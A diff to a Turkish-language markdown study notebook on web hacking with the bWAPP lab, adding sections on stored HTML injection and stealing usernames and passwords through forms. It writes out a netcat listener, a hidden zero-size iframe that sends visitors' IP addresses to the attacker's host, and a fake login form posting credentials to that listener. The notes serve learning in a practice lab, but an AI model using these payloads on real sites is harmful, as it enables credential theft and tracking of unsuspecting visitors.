@@ -20,7 +20,7 @@
   - [Burpsuite İçine Sertifika Yükleme](#Burpsuite-İçine-Sertifika-Yükleme)
 - [bWAPP](#bWAPP)
   - [bWAPP Kurulumu](#bWAPP-Kurulumu)
-  - [HTML Injection Reflected (low level)](#HTML-Injection-Reflected-(lowlevel))
+  - [HTML Injection Reflected (low level)](#HTML-Injection-Reflected-(low-level))
   - [HTML Injection Stored (low level)](#HTML-Injection-Stored-(low-level))
   - [Formlardan Kullanıcı Adı ve Şifre Hackleme](#Formlardan-Kullanıcı-Adı-ve-Şifre-Hackleme)
   - [Dırbuster](#Dırbuster)
@@ -192,3 +192,33 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 - Name kısmına ```<h1>Hello<script>alert(1)</script>!</h1>```
 ![]()
 ! Eğer çalışıyorsa sitede HTML injection vardır ve JS kodu çalıştırılabiliyordur
+
+> ## HTML Injection Stored (low level)
+
+! ```Stored``` o siteye giren herkesi etkiliyor demektir. (Örneğin blog siteleri)
+
+- Yazı yazdığımız kısıma ```<h1>ahmet</h1>``` deniyoruz, eğer çalışıyorsa açık var demektir
+- ```<iframe src="{resim linki}"></iframe>``` ile blog sitesine resim eklemeyi deniyoruz
+
+! Google'a ```iframe html``` aratarak gerekli diğer kodlara erişebiliriz
+
+- ```nc -nvlp 4545``` ile NATCAT açıyoruz
+- ```<iframe src="http://192.168.123.123:4545/test" height="0" width="0"></iframe>``` Normalde IP adresimiz bizim Publıc IP'miz olmalıdır, Port numarası çalışmazsa değiştirilebilir, ```height ve width```'i blog'a eklenen şey görülmesin diye 0 yapıyoruz
+- Artık o siteye giren cihazların IP adreslerini görebiliriz
+- ![]()
+
+> ## Formlardan Kullanıcı Adı ve Şifre Hackleme
+
+- ```nc -nvlp 4545``` ile NATCAT çalıştırıyoruz
+- ```geany``` açıyoruz
+```
+<form name="login" action="http://192.168.123.123:4545/test.html">
+  <table>
+	  <tr><td>Username:</td><td><input type="text" name="username" placeholder="username"></td></tr>
+		<tr><td>Password:</td><td><input type="password" name="password" placeholder="password"></td></tr>
+	</table>
+	<input type="submit" value="Login">
+</form>
+```
+- Yazdığımız HTML kodunu blog'a yapıştırıyoruz. Kodu yazdığımız sitenin kendi login ekranının hazır HTML kodlarınıda yapıştırabiliriz
+- Kullanıcılar o kısıma login yaptıklarında giriş bilgilerini ```NATCAT``` üzerinden görebiliriz
